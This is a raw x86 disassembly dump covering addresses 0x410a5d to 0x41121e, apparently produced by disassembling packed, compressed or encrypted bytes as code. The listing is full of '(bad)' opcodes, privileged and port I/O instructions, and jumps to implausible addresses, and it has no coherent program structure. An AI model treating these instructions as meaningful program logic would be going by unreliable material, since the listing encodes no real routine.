  410a5d:	push   cs
  410a5e:	xor    al,0xe
  410a60:	add    eax,0x83f7286f
  410a65:	lds    ebx,FWORD PTR [edx]
  410a67:	cmp    ecx,DWORD PTR [ebp-0xdb15465]
  410a6d:	sahf   
  410a6e:	fs jp  0x410a83
  410a71:	sti    
  410a72:	xchg   DWORD PTR [ebp-0x6f15eb7a],esp
  410a78:	pop    eax
  410a79:	jbe    0x410a71
  410a7b:	rol    BYTE PTR [eax-0x5837f4db],1
  410a81:	push   0x70e86d6a
  410a86:	push   0x8c0f0625
  410a8b:	aad    0xe4
  410a8d:	jp     0x410a7f
  410a8f:	test   eax,0x72739303
  410a94:	cwde   
  410a95:	add    cl,ah
  410a97:	sbb    BYTE PTR [ecx+0x15],dl
  410a9a:	addr16 or al,0xf2
  410a9d:	lock lods eax,DWORD PTR ds:[esi]
  410a9f:	lds    ecx,FWORD PTR [ebx-0x8]
  410aa2:	js     0x410a61
  410aa4:	mov    al,0x65
  410aa6:	push   ds
  410aa7:	cdq    
  410aa8:	xor    cl,BYTE PTR [edi]
  410aaa:	or     DWORD PTR [edx],ebp
  410aac:	push   edi
  410aad:	out    dx,eax
  410aae:	jnp    0x410b20
  410ab0:	xchg   edx,eax
  410ab1:	fcmovbe st,st(5)
  410ab3:	retf   
  410ab4:	sub    BYTE PTR [esi+0x33],bh
  410ab7:	scas   eax,DWORD PTR es:[edi]
  410ab8:	xor    ah,BYTE PTR ds:0x9cf6dbbe
  410abe:	jb     0x410ac7
  410ac0:	jae    0x410a7e
  410ac2:	fcom   QWORD PTR [edx]
  410ac4:	cs stos BYTE PTR es:[edi],al
  410ac6:	mov    dh,0xa7
  410ac8:	and    esp,ebp
  410aca:	jno    0x410a90
  410acc:	mov    bh,0x55
  410ace:	icebp  
  410acf:	sub    bl,0x8f
  410ad2:	sub    al,BYTE PTR [ebp-0x10]
  410ad5:	cwde   
  410ad6:	xchg   ebx,eax
  410ad7:	dec    esi
  410ad8:	dec    edi
  410ad9:	popa   
  410ada:	mov    DWORD PTR [edi+0x2018c478],0x7fe61358
  410ae4:	dec    esi
  410ae5:	xor    dl,BYTE PTR [ecx]
  410ae7:	(bad)  
  410ae8:	shr    BYTE PTR [ebp+0x70],1
  410aeb:	xchg   esi,eax
  410aec:	jbe    0x410afe
  410aee:	sub    eax,edx
  410af0:	cli    
  410af1:	popa   
  410af2:	aaa    
  410af3:	push   0xc66b6f02
  410af8:	popf   
  410af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410afa:	dec    esp
  410afb:	cmp    DWORD PTR [eax],0x6b
  410afe:	jo     0x410b4a
  410b00:	lock mul edi
  410b03:	jle    0x410ac8
  410b05:	pop    edx
  410b06:	fwait
  410b07:	(bad)  
  410b08:	jo     0x410ae8
  410b0a:	inc    edx
  410b0b:	pop    ss
  410b0c:	push   esp
  410b0d:	push   ebx
  410b0e:	iret   
  410b0f:	stos   DWORD PTR es:[edi],eax
  410b10:	into   
  410b11:	mov    bl,0xc3
  410b13:	imul   ebp,esi,0xdfdc7039
  410b19:	mov    al,ds:0x4cb393fd
  410b1e:	jbe    0x410b70
  410b20:	pop    esp
  410b21:	popf   
  410b22:	es mov ebx,0x8f47c75e
  410b28:	(bad)
  410b2c:	aam    0x9a
  410b2e:	xchg   edi,eax
  410b2f:	mov    bh,0x20
  410b31:	add    eax,0x62ad4b09
  410b36:	mov    al,0xf6
  410b38:	das    
  410b39:	lea    ebp,[ebx+0x7b]
  410b3c:	aas    
  410b3d:	sub    BYTE PTR [eax+0x54],bl
  410b40:	pop    ebp
  410b41:	pop    edx
  410b42:	(bad)  
  410b43:	lods   al,BYTE PTR ds:[esi]
  410b44:	fmul   DWORD PTR [esi+0x62570a62]
  410b4a:	ds (bad) 
  410b4c:	clc    
  410b4d:	ret    
  410b4e:	not    BYTE PTR [ebx]
  410b50:	les    esi,FWORD PTR [ebx]
  410b52:	mov    esi,0x9c011f24
  410b57:	out    dx,al
  410b58:	sahf   
  410b59:	sbb    ebx,edi
  410b5b:	sahf   
  410b5c:	xor    ah,BYTE PTR [ebx]
  410b5e:	stos   BYTE PTR es:[edi],al
  410b5f:	adc    al,cl
  410b61:	enter  0x8db3,0xd2
  410b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b66:	and    ch,0x38
  410b69:	sbb    esi,DWORD PTR [ebx+0x44]
  410b6c:	repz inc edx
  410b6e:	push   edx
  410b6f:	dec    edi
  410b70:	dec    esi
  410b71:	pop    es
  410b72:	sbb    bh,al
  410b74:	push   edx
  410b75:	mov    eax,0xa1803448
  410b7a:	or     BYTE PTR [edi],bl
  410b7c:	sub    al,0xf5
  410b7e:	jne    0x410ba3
  410b80:	push   edi
  410b81:	jmp    0x410b40
  410b83:	and    eax,0x3910c5c
  410b88:	aaa    
  410b89:	lock xor eax,0xeafe46c8
  410b8f:	push   esi
  410b90:	repz pop ss
  410b92:	shr    DWORD PTR [ecx+0x72b06784],cl
  410b98:	sub    dh,0xa4
  410b9b:	inc    edi
  410b9c:	sbb    dl,BYTE PTR [ecx+0x35b47b37]
  410ba2:	inc    esi
  410ba3:	mov    dh,0xfc
  410ba5:	ja     0x410b95
  410ba7:	cmp    eax,0xe007a84e
  410bac:	and    DWORD PTR [eax+0x2a],edx
  410baf:	xchg   ebp,eax
  410bb0:	pop    ebx
  410bb1:	sbb    eax,0x91fc50b3
  410bb6:	fprem1 
  410bb8:	fild   DWORD PTR [eax+0x39]
  410bbb:	in     al,0x95
  410bbd:	pop    ecx
  410bbe:	ds push edx
  410bc0:	add    esi,DWORD PTR [edx]
  410bc2:	jns    0x410c31
  410bc4:	sub    BYTE PTR [edi-0x27],al
  410bc7:	cmc    
  410bc8:	repz pusha 
  410bca:	add    eax,0xc8fff913
  410bcf:	lods   al,BYTE PTR ds:[esi]
  410bd0:	jl     0x410bf8
  410bd2:	loope  0x410c39
  410bd4:	add    ebx,DWORD PTR [edi]
  410bd6:	sbb    DWORD PTR [eax-0x62],ecx
  410bd9:	jmp    FWORD PTR es:[ecx]
  410bdc:	and    al,0xf4
  410bde:	(bad)  
  410bdf:	adc    al,0xb9
  410be1:	rol    DWORD PTR [edx+0x54],cl
  410be4:	repnz mov DWORD PTR [edi+0x18],esi
  410be8:	xor    DWORD PTR [edi+0x746748d5],0xca1589ae
  410bf2:	pusha  
  410bf3:	adc    al,0x6c
  410bf5:	adc    al,BYTE PTR [ebx+esi*1]
  410bf8:	out    dx,eax
  410bf9:	mov    ebx,0xae72d669
  410bfe:	mov    al,ds:0xae951640
  410c03:	xor    DWORD PTR [ecx+0x15],esi
  410c06:	inc    edx
  410c07:	pop    edx
  410c08:	aas    
  410c09:	dec    edi
  410c0a:	and    DWORD PTR [edx-0x52],0x56b8579a
  410c11:	es or  al,0xbf
  410c14:	xor    al,0x9b
  410c16:	jmp    0xdf56dcd
  410c1b:	pop    esp
  410c1c:	fnstcw WORD PTR [ebp-0x1f]
  410c1f:	nop
  410c20:	int3   
  410c21:	xchg   esi,eax
  410c22:	fcomi  st,st(6)
  410c24:	sub    ch,0x65
  410c27:	inc    ebx
  410c28:	lea    esi,[edi]
  410c2a:	je     0x410c4e
  410c2c:	xor    eax,0x7b41be24
  410c31:	sub    BYTE PTR [bp+si+0x7b],dl
  410c35:	iret   
  410c36:	lods   eax,DWORD PTR ds:[esi]
  410c37:	mov    al,0x92
  410c39:	pop    ebx
  410c3a:	or     esp,DWORD PTR [ecx]
  410c3c:	lods   eax,DWORD PTR ds:[esi]
  410c3d:	xor    ebp,edi
  410c3f:	neg    DWORD PTR [eax]
  410c41:	mov    esp,0x888a63cd
  410c46:	iret   
  410c47:	mov    ds:0x12428a6c,eax
  410c4c:	push   es
  410c4d:	rcl    BYTE PTR [esi-0x23a8a799],1
  410c53:	mov    edi,0x70ed8175
  410c58:	stos   DWORD PTR es:[edi],eax
  410c59:	into   
  410c5a:	or     DWORD PTR [edi+0x6af00c9d],0xffffffa2
  410c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c62:	jl     0x410c5b
  410c64:	or     al,dh
  410c66:	mov    WORD PTR [ecx+eiz*4],es
  410c69:	in     eax,0x49
  410c6b:	popa   
  410c6c:	std    
  410c6d:	jecxz  0x410c55
  410c6f:	mov    ah,0xb3
  410c71:	stc    
  410c72:	das    
  410c73:	aaa    
  410c74:	inc    eax
  410c75:	add    DWORD PTR [ebx+0x173ffce6],0x55
  410c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c7d:	pop    ss
  410c7e:	mov    eax,0xffbcd06e
  410c83:	int3   
  410c84:	xor    esi,ebx
  410c86:	das    
  410c87:	lahf   
  410c88:	push   cs
  410c89:	repz sbb eax,0x66a30b0e
  410c8f:	lock pop ecx
  410c91:	adc    BYTE PTR [edx-0x7e],dl
  410c94:	xchg   esp,eax
  410c95:	add    dh,BYTE PTR [ebx-0x534814c7]
  410c9b:	outs   dx,BYTE PTR ds:[esi]
  410c9c:	add    esi,DWORD PTR [edi+0x76]
  410c9f:	xor    eax,0x6707be7a
  410ca4:	or     DWORD PTR [edi-0x70497741],0x6b88bc00
  410cae:	dec    ecx
  410caf:	mov    ds:0x608f2781,al
  410cb4:	xchg   esi,eax
  410cb5:	adc    eax,0x2d738914
  410cba:	xchg   edi,eax
  410cbb:	rcl    DWORD PTR ds:0x4c0dc501,1
  410cc1:	shl    DWORD PTR [ebx],1
  410cc3:	inc    ebp
  410cc4:	lds    eax,FWORD PTR [esi+0xf1ead10]
  410cca:	mov    ecx,0xc8da42ae
  410ccf:	mov    ds:0xfed579db,eax
  410cd4:	push   cs
  410cd5:	dec    esp
  410cd6:	adc    DWORD PTR [eax],esi
  410cd8:	inc    ebx
  410cd9:	cdq    
  410cda:	sbb    dh,BYTE PTR [eax-0x3f572160]
  410ce0:	pop    ecx
  410ce1:	mov    edi,0x132d9bf6
  410ce6:	mov    bl,0x63
  410ce8:	jae    0x410d24
  410cea:	ja     0x410d39
  410cec:	mov    ch,0x64
  410cee:	btc    DWORD PTR [edi+0x2e21e384],ecx
  410cf5:	shr    DWORD PTR [edi-0x3b043c53],cl
  410cfb:	dec    eax
  410cfc:	xchg   edx,eax
  410cfd:	mov    bl,0xfa
  410cff:	out    0x20,eax
  410d01:	push   ebp
  410d02:	loop   0x410ce0
  410d04:	ret    0x4456
  410d07:	xchg   esi,eax
  410d08:	xchg   ebx,eax
  410d09:	pusha  
  410d0a:	es push es
  410d0c:	inc    esp
  410d0d:	xchg   edx,eax
  410d0e:	ror    DWORD PTR ds:0x48669707,0xd7
  410d15:	iret   
  410d16:	xchg   esi,eax
  410d17:	loope  0x410cc8
  410d19:	neg    DWORD PTR [esi-0x39d08de8]
  410d1f:	add    eax,0x75186472
  410d24:	xchg   esi,eax
  410d25:	retf   
  410d26:	add    DWORD PTR [edx+0x2514f0d],eax
  410d2c:	xor    DWORD PTR [edx+edi*4-0x10223337],edi
  410d33:	mov    ds:0x8e1c9acd,al
  410d38:	cdq    
  410d39:	adc    ebp,DWORD PTR [edi]
  410d3b:	xor    eax,DWORD PTR [edx]
  410d3d:	ss (bad) 
  410d3f:	pushw  ss
  410d41:	lods   al,BYTE PTR ds:[esi]
  410d42:	out    dx,al
  410d43:	ret    
  410d44:	test   ebx,esi
  410d46:	push   0xe21709c7
  410d4b:	add    bl,BYTE PTR [ecx+0x10]
  410d4e:	jns    0x410d13
  410d50:	ret    0x2c73
  410d53:	pushw  0x12
  410d56:	sub    esp,DWORD PTR ds:0x9bb2629a
  410d5c:	inc    ebp
  410d5d:	jle    0x410d82
  410d5f:	js     0x410d42
  410d61:	inc    ecx
  410d62:	or     DWORD PTR [ecx+0x5ae7dda6],edx
  410d68:	(bad)  
  410d6a:	ins    BYTE PTR es:[edi],dx
  410d6b:	sahf   
  410d6c:	cmc    
  410d6d:	dec    ebp
  410d6e:	cmp    DWORD PTR [edx-0x156f9640],ebx
  410d74:	sub    esi,0x45
  410d77:	ds icebp 
  410d79:	cwde   
  410d7a:	cld    
  410d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d7c:	repz in eax,0xb8
  410d7f:	loope  0x410d8a
  410d81:	add    al,0xc7
  410d83:	sub    ah,BYTE PTR [ebx+0x2b]
  410d86:	ja     0x410da8
  410d88:	push   ecx
  410d89:	jno    0x410d77
  410d8b:	and    esp,esp
  410d8d:	in     eax,0x25
  410d8f:	mov    dh,dh
  410d91:	mov    ebx,0x8d03b14a
  410d96:	push   esp
  410d97:	idiv   BYTE PTR [edx+0x1a3549e3]
  410d9d:	xor    BYTE PTR [eax],dh
  410d9f:	int    0x22
  410da1:	xchg   ebx,eax
  410da2:	in     al,dx
  410da3:	(bad)  
  410da4:	mov    dl,0xfe
  410da6:	mov    bl,0xb0
  410da8:	sar    DWORD PTR [eax+ecx*4+0x38],0x63
  410dad:	loop   0x410de3
  410daf:	add    BYTE PTR [esi+0x4c],bl
  410db2:	jnp    0x410de0
  410db4:	pop    ebx
  410db5:	pop    ds
  410db6:	pop    ecx
  410db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410db8:	add    eax,DWORD PTR [edi-0xd]
  410dbb:	xor    al,0x38
  410dbd:	test   BYTE PTR [esi+0x4ac9e83f],dh
  410dc3:	fistp  DWORD PTR [eax]
  410dc5:	je     0x410d50
  410dc7:	popa   
  410dc8:	adc    esi,ebp
  410dca:	push   0x2b
  410dcc:	clc    
  410dcd:	add    eax,0x9040d956
  410dd2:	mov    dl,0xeb
  410dd4:	js     0x410e4c
  410dd6:	mov    bl,0xfa
  410dd8:	mov    dl,0x1f
  410dda:	out    dx,eax
  410ddb:	and    edx,eax
  410ddd:	sub    edx,eax
  410ddf:	adc    al,BYTE PTR [ebx]
  410de1:	lds    ebp,FWORD PTR [edx+0x1f]
  410de4:	cmp    BYTE PTR [edx],0x8a
  410de7:	mov    edx,DWORD PTR [ebp+0x8]
  410dea:	jmp    0x4111de
  410def:	inc    edi
  410df0:	cli    
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x7bcd5da4
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410dcb
  410e08:	push   ebp
  410e09:	rcl    eax,cl
  410e0b:	mov    esi,0x54cc6965
  410e10:	shl    esp,cl
  410e12:	cwde   
  410e13:	fwait
  410e14:	pop    eax
  410e15:	mov    gs,WORD PTR [ebx+ecx*1+0xf37acdc]
  410e1c:	fmul   QWORD PTR [esp+ebp*8]
  410e1f:	retf   
  410e20:	jge    0x410e0e
  410e22:	dec    edi
  410e23:	jmp    0x4aac75ad
  410e28:	aaa    
  410e29:	out    0x98,al
  410e2b:	aam    0x3
  410e2d:	fadd   DWORD PTR [eax+edi*4-0x20]
  410e31:	fwait
  410e32:	sbb    al,0x5a
  410e34:	not    BYTE PTR [eax+0x65]
  410e37:	inc    eax
  410e38:	mov    ebx,0x260f3060
  410e3d:	jno    0x410df8
  410e3f:	daa    
  410e40:	sbb    edi,DWORD PTR [ecx]
  410e42:	xchg   esi,eax
  410e43:	mov    esp,0x9df99b03
  410e48:	cs out dx,al
  410e4a:	inc    ebx
  410e4b:	push   edx
  410e4c:	sbb    dl,ch
  410e4e:	aam    0xc1
  410e50:	(bad)
  410e53:	add    BYTE PTR [eax-0x4e],cl
  410e56:	lods   eax,DWORD PTR ds:[esi]
  410e57:	rol    BYTE PTR [eax],0x8b
  410e5a:	sub    al,0xd6
  410e5c:	sti    
  410e5d:	inc    ebp
  410e5f:	pop    ebp
  410e60:	add    BYTE PTR [edx],dh
  410e62:	dec    edx
  410e63:	mov    esp,0x11e577e2
  410e68:	ret    0xfa65
  410e6b:	shl    ebp,1
  410e6d:	jmp    0x410e97
  410e6f:	jo     0x410e7e
  410e71:	or     BYTE PTR [ebx],0xab
  410e74:	in     eax,0xad
  410e76:	retf   0x2b7c
  410e79:	aam    0x54
  410e7b:	mov    BYTE PTR [esi-0x6ce02074],0x71
  410e82:	rcl    edi,cl
  410e84:	fwait
  410e85:	lss    edx,FWORD PTR [ecx+ebx*8-0x6b]
  410e8a:	cli    
  410e8b:	test   DWORD PTR [ecx+0x1f3c103b],eax
  410e91:	mov    ah,0xec
  410e93:	shl    dh,1
  410e95:	cmc    
  410e96:	jg     0x410e91
  410e98:	or     DWORD PTR [eax],edi
  410e9a:	xor    bl,BYTE PTR [ecx]
  410e9c:	add    BYTE PTR [ebp+0x10],al
  410e9f:	nop
  410ea0:	lods   al,BYTE PTR ds:[esi]
  410ea1:	test   al,0x75
  410ea3:	mov    al,ds:0xd7c7c727
  410ea8:	cmc    
  410ea9:	mov    eax,0xa7bdcea7
  410eae:	cmp    DWORD PTR [eax],0xd26b6460
  410eb4:	push   ebp
  410eb5:	ret    0x886c
  410eb8:	adc    BYTE PTR [eax],al
  410eba:	(bad)  
  410ebc:	or     DWORD PTR [ecx-0x419d05d4],esi
  410ec2:	push   ebx
  410ec3:	hlt    
  410ec4:	out    0x7c,eax
  410ec6:	es dec esi
  410ec8:	pop    eax
  410ec9:	push   esi
  410eca:	mov    eax,ds:0xc277c67e
  410ecf:	aaa    
  410ed0:	sbb    eax,DWORD PTR [esi]
  410ed2:	sub    al,0xc9
  410ed4:	mov    eax,0xcc68d6d9
  410ed9:	fild   DWORD PTR [esi+0x55867890]
  410edf:	ret    0x538f
  410ee2:	(bad)  
  410ee3:	sub    bh,BYTE PTR [esi-0x38]
  410ee6:	sbb    eax,0x8cb7b878
  410eeb:	push   ecx
  410eec:	inc    edx
  410eed:	mov    al,ds:0x80c1ef1
  410ef2:	arpl   WORD PTR [edi+0x3c21b5b1],sp
  410ef8:	lock out 0x97,al
  410efb:	sbb    al,0x95
  410efd:	fst    DWORD PTR [ebx-0x3c46454f]
  410f03:	(bad)  
  410f04:	into   
  410f05:	std    
  410f06:	mov    esp,0x8c99ffce
  410f0b:	add    al,0x3c
  410f0d:	pop    edi
  410f0e:	cmp    al,0xc5
  410f10:	mov    edi,0x498d8e51
  410f15:	arpl   bp,ax
  410f17:	jmp    0x8b6b:0x143ee6e5
  410f1e:	add    ah,BYTE PTR [ebx+0x469f464d]
  410f24:	fdiv   QWORD PTR [ecx]
  410f26:	add    DWORD PTR [ebx+ebp*1+0x7e489547],ecx
  410f2d:	sbb    al,0x70
  410f2f:	(bad)  
  410f30:	cdq    
  410f31:	test   eax,0x997b9287
  410f36:	cmp    BYTE PTR [eax+eax*4+0x63839ea6],0x33
  410f3e:	retf   
  410f3f:	cmp    al,0x24
  410f41:	jns    0x410f93
  410f43:	adc    DWORD PTR [edx+edi*2],eax
  410f46:	ins    DWORD PTR es:[edi],dx
  410f47:	xchg   edi,eax
  410f48:	dec    esp
  410f49:	test   DWORD PTR [eax],edi
  410f4b:	stc    
  410f4c:	cmp    BYTE PTR [ecx+0x934aada],dl
  410f52:	ucomiss xmm2,DWORD PTR [eax]
  410f55:	retf   
  410f56:	fwait
  410f57:	jg     0x410f0e
  410f59:	int    0xf0
  410f5b:	pop    ebp
  410f5c:	xchg   esp,eax
  410f5d:	aaa    
  410f5e:	in     eax,0x8d
  410f60:	pop    edx
  410f61:	and    dl,bl
  410f63:	cdq    
  410f64:	pop    ebp
  410f65:	dec    eax
  410f66:	imul   esp,DWORD PTR [ebx],0x3c
  410f69:	popa   
  410f6a:	xchg   ebp,eax
  410f6b:	test   al,0x5b
  410f6d:	lods   ax,WORD PTR ds:[esi]
  410f6f:	mul    edi
  410f71:	out    dx,al
  410f72:	cdq    
  410f73:	stos   DWORD PTR es:[edi],eax
  410f74:	mov    cl,0xd6
  410f76:	fdiv   DWORD PTR [edx-0x7d62bd71]
  410f7c:	lahf   
  410f7d:	fs or  ax,0xdef8
  410f82:	daa    
  410f83:	arpl   dx,si
  410f85:	fs push 0xf62a00de
  410f8b:	cli    
  410f8c:	sti    
  410f8d:	outs   dx,BYTE PTR ds:[esi]
  410f8e:	sub    BYTE PTR [esi+0x4615f405],ah
  410f94:	mov    al,ds:0x565407c7
  410f99:	(bad)  
  410f9a:	mov    esp,0xe52cbb11
  410f9f:	mov    si,0xf1a3
  410fa3:	sbb    eax,0x811697b3
  410fa8:	inc    ecx
  410fa9:	scas   eax,DWORD PTR es:[edi]
  410faa:	repz fild QWORD PTR [ecx]
  410fad:	mov    esi,0xc18d22f8
  410fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fb3:	sti    
  410fb4:	retf   
  410fb5:	dec    edx
  410fb6:	or     DWORD PTR [edi+0x5],eax
  410fb9:	mov    bh,0x60
  410fbb:	mov    cl,0xa0
  410fbd:	rcl    DWORD PTR [ebp+0x7d],1
  410fc0:	and    BYTE PTR [ebp+0x7d],bh
  410fc3:	xor    eax,0x334dd0d8
  410fc8:	pop    esp
  410fc9:	xchg   esi,eax
  410fca:	mov    bh,0x28
  410fcc:	imul   edx,DWORD PTR [esi],0x58
  410fcf:	sub    al,0x2c
  410fd2:	dec    ecx
  410fd3:	mov    esp,0xcad4102c
  410fd8:	test   DWORD PTR [ecx],esp
  410fda:	lods   eax,DWORD PTR ds:[esi]
  410fdb:	xchg   bh,al
  410fdd:	loop   0x410fc2
  410fdf:	dec    ecx
  410fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fe1:	es test al,0x48
  410fe4:	adc    eax,0xa5311f10
  410fe9:	jnp    0x410fba
  410feb:	dec    ebp
  410fec:	lds    ebx,FWORD PTR [edi]
  410fee:	jae    0x411035
  410ff0:	inc    esi
  410ff1:	sbb    BYTE PTR [eax-0x7b],dh
  410ff4:	dec    eax
  410ff5:	mov    BYTE PTR ds:0x1f79b1c4,bh
  410ffb:	repnz sahf 
  410ffd:	inc    edi
  410ffe:	or     eax,DWORD PTR [edx+0x43]
  411001:	dec    eax
  411002:	sbb    BYTE PTR [edx+0x4ac39d5b],bh
  411008:	jbe    0x41100f
  41100a:	bound  edi,QWORD PTR [eax+0x33427401]
  411010:	xchg   ebx,eax
  411011:	or     bl,BYTE PTR [ebx+0x4fd5e3dc]
  411017:	mov    WORD PTR [ecx-0x376137c9],?
  41101d:	cli    
  41101e:	pop    es
  41101f:	mov    esi,0x59472748
  411024:	test   al,0x6
  411026:	push   cs
  411027:	mov    esi,0xe92998bd
  41102c:	jge    0x410fc4
  41102e:	xchg   ebp,eax
  41102f:	pop    ebx
  411030:	retf   
  411031:	mov    ds,ebx
  411033:	lods   al,BYTE PTR ds:[esi]
  411034:	test   eax,0xc1dd7376
  411039:	call   0xb9395c4d
  41103e:	sti    
  41103f:	jmp    0x86613140
  411044:	and    esp,DWORD PTR [edi+eiz*2]
  411047:	jecxz  0x41109c
  411049:	mov    esi,0x3d41eae5
  41104e:	fadd   DWORD PTR [ebx-0x50a34595]
  411054:	cmp    dh,dh
  411056:	or     ebp,edi
  411058:	xor    edi,esi
  41105a:	loop   0x4110ae
  41105c:	pop    es
  41105d:	jge    0x411084
  41105f:	mov    ds:0xf100585a,eax
  411064:	ss mov ebx,0x63b8f5cb
  41106a:	mov    al,ds:0x32c51471
  41106f:	scas   al,BYTE PTR es:[edi]
  411070:	push   eax
  411071:	daa    
  411072:	pop    ebp
  411073:	mov    esi,0xfedf9228
  411078:	xor    eax,ecx
  41107a:	cmp    BYTE PTR [ebx],0xad
  41107d:	jmp    0x89cf:0xc2282a35
  411084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411085:	xchg   ebx,eax
  411086:	adc    eax,eax
  411088:	cmp    ah,BYTE PTR [esi]
  41108a:	xchg   esi,eax
  41108b:	mov    BYTE PTR [eax-0x3d],cl
  41108e:	(bad)  
  41108f:	leave  
  411090:	jge    0x4110e3
  411092:	mov    esp,0xb0a573f0
  411097:	fwait
  411098:	inc    esp
  411099:	call   0x1acfce43
  41109e:	dec    ebp
  41109f:	popw   ss
  4110a1:	push   es
  4110a2:	frndint 
  4110a4:	pop    edi
  4110a5:	sbb    dh,BYTE PTR [eax+0x6f]
  4110a8:	push   cs
  4110a9:	xor    ah,dl
  4110ab:	push   edi
  4110ac:	cmp    esi,DWORD PTR [edi+0x42]
  4110af:	jb     0x4110b7
  4110b1:	ret    0x5ad3
  4110b4:	push   ebp
  4110b5:	in     eax,dx
  4110b6:	fld    TBYTE PTR [edx-0x7d]
  4110b9:	jnp    0x41103b
  4110bb:	loope  0x411118
  4110bd:	fwait
  4110be:	mov    ebp,ebp
  4110c0:	(bad)  
  4110c2:	jbe    0x4110a1
  4110c4:	xchg   esp,eax
  4110c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c6:	mov    esi,0xf4243178
  4110cb:	mov    esp,0x6bc848d2
  4110d0:	daa    
  4110d1:	nop
  4110d2:	(bad)  
  4110d4:	xchg   esi,eax
  4110d5:	push   eax
  4110d6:	mov    eax,0xc51fbdec
  4110db:	xor    al,0x9b
  4110dd:	fst    DWORD PTR [ecx-0x40e938b1]
  4110e3:	push   edi
  4110e4:	cmp    esp,ebx
  4110e6:	or     ah,BYTE PTR [ebx-0x29]
  4110e9:	cmp    al,0x7e
  4110eb:	test   al,0x11
  4110ed:	loop   0x4110fc
  4110ef:	push   eax
  4110f0:	or     BYTE PTR [edi+eiz*8],dl
  4110f3:	mov    dh,0xe8
  4110f5:	pushf  
  4110f6:	or     DWORD PTR [ecx-0x3f],0x4281700a
  4110fd:	rcl    al,cl
  4110ff:	cmp    eax,0xdc6b1f57
  411104:	xlat   BYTE PTR ds:[ebx]
  411105:	mov    al,0xf8
  411107:	mov    bl,0xa2
  411109:	pop    edi
  41110a:	xor    ch,BYTE PTR [eax]
  41110c:	imul   esi,DWORD PTR [ecx-0x12cfacc4],0xcbecca42
  411116:	push   ecx
  411117:	rcl    BYTE PTR [ebp+0x4e21be24],1
  41111d:	pop    ecx
  41111e:	arpl   WORD PTR [edi],dx
  411120:	adc    DWORD PTR [ebp-0x364acbcd],edi
  411126:	xchg   esi,eax
  411127:	jne    0x41113e
  411129:	push   edi
  41112a:	es adc al,0x69
  41112d:	pusha  
  41112e:	loope  0x411101
  411130:	fidivr WORD PTR [edi]
  411132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411133:	inc    edx
  411134:	in     al,0x41
  411136:	mov    ebx,0x5abc2e45
  41113b:	and    ebp,DWORD PTR [ebx+eax*2+0x72ed255c]
  411142:	sbb    BYTE PTR [edi],dh
  411144:	enter  0x6aea,0xb0
  411148:	scas   al,BYTE PTR es:[edi]
  411149:	out    0x2b,al
  41114b:	outs   dx,BYTE PTR ds:[esi]
  41114c:	pop    edi
  41114d:	out    dx,eax
  41114e:	xor    DWORD PTR [ebx-0x64],eax
  411151:	js     0x41113a
  411153:	mov    bl,0xa5
  411155:	in     al,dx
  411156:	push   esp
  411157:	or     eax,0xb351b6a1
  41115c:	cmp    cl,BYTE PTR [edi]
  41115e:	cmp    eax,0xe842563
  411163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411164:	mov    dl,0x5b
  411166:	enter  0x5f05,0x62
  41116a:	std    
  41116b:	mov    ebp,DWORD PTR [esp+eax*4]
  41116e:	inc    edx
  41116f:	xchg   edx,eax
  411170:	cmp    edi,DWORD PTR [esi+ebp*2+0x47]
  411174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411175:	enter  0x1aa3,0x5e
  411179:	stc    
  41117a:	push   esp
  41117b:	enter  0x8575,0x78
  41117f:	(bad)  
  411180:	test   eax,0xd7099bfd
  411185:	hlt    
  411186:	pop    esi
  411187:	xchg   edx,eax
  411188:	jno    0x411199
  41118a:	outs   dx,BYTE PTR ds:[esi]
  41118b:	xor    esi,ebx
  41118d:	mov    esi,0x17ca7a9b
  411192:	rol    eax,0x1d
  411195:	call   0x3ee5:0x197c1741
  41119c:	push   ds
  41119d:	fs pop es
  41119f:	mov    edx,0x8830332b
  4111a4:	push   0x9dbe109f
  4111a9:	cli    
  4111aa:	mov    cl,0x26
  4111ac:	jns    0x411148
  4111ae:	(bad)  
  4111af:	mov    ebp,0x7b2d5eef
  4111b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111b5:	jl     0x4111c8
  4111b7:	adc    eax,0x3ed933af
  4111bc:	xor    DWORD PTR [ebx+0x7e842970],0x70
  4111c3:	xor    ch,BYTE PTR [edi]
  4111c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c6:	push   0x3df922b5
  4111cb:	mov    bl,BYTE PTR ds:0xf6a81f2c
  4111d1:	(bad)  
  4111d2:	jae    0x4111f8
  4111d4:	xchg   edi,eax
  4111d5:	test   BYTE PTR [eax+0x4c],bl
  4111d8:	adc    dh,dh
  4111da:	mov    dl,0x11
  4111dc:	mov    ebx,DWORD PTR [ebx-0x7b723ecd]
  4111e2:	adc    BYTE PTR [edx+esi*2+0x45890032],bl
  4111e9:	or     BYTE PTR [ebx-0x101617bb],cl
  4111ef:	add    eax,DWORD PTR [eax]
  4111f1:	add    BYTE PTR [eax-0x646c64c4],dh
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp-0x3dbca301],cl
  4111ff:	mov    BYTE PTR [edi+0x704495a1],cl
  411205:	jo     0x411250
  411207:	jge    0x411279
  411209:	jo     0x4111cf
  41120b:	jecxz  0x41121c
  41120d:	jae    0x41119e
  41120f:	popa   
  411210:	mov    ah,0x54
  411212:	dec    ecx
  411213:	and    BYTE PTR [esi-0x4c],al
  411216:	(bad)  [ecx-0x8]
  411219:	(bad)  
  41121a:	scas   al,BYTE PTR es:[edi]
  41121b:	jns    0x411242
  41121d:	icebp  
  41121e:	xchg   ebp,eax
